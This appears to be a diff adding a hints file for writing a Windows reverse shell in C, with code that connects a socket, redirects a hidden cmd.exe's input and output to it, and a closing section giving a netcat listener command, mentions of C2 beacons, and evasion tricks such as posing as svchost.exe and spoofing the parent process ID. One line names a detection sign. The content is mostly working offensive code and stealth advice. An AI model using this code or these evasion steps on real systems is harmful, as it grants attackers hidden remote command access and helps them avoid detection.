@@ -1,0 +1,23 @@
+=== HINT 1: Create socket + connect ===
+SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
+int conn = connect(s, (struct sockaddr*)&addr, sizeof(addr));
+
+=== HINT 2: Configure STARTUPINFO ===
+si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+si.wShowWindow = SW_HIDE;
+si.hStdInput   = (HANDLE)s;
+si.hStdOutput  = (HANDLE)s;
+si.hStdError   = (HANDLE)s;
+
+=== HINT 3: Spawn cmd.exe ===
+// bInheritHandles=TRUE so child inherits socket handles
+CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
+WaitForSingleObject(pi.hProcess, INFINITE);
+
+=== KEY INSIGHT ===
+Listener: nc -lvnp 4444  (or ncat, pwncat, metasploit handler)
+Bind shell: opposite - target listens, attacker connects.
+Encrypted shell: use TLS socket or tunnel through HTTP (C2 beacon is a superset).
+Detection: unusual parent process (powershell.exe, mshta.exe, wscript.exe spawning cmd.exe).
+Evasion: name the process "svchost.exe" (copy to temp, spawn with spoofed PPID).
+PPID spoofing: UpdateProcThreadAttribute with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS.
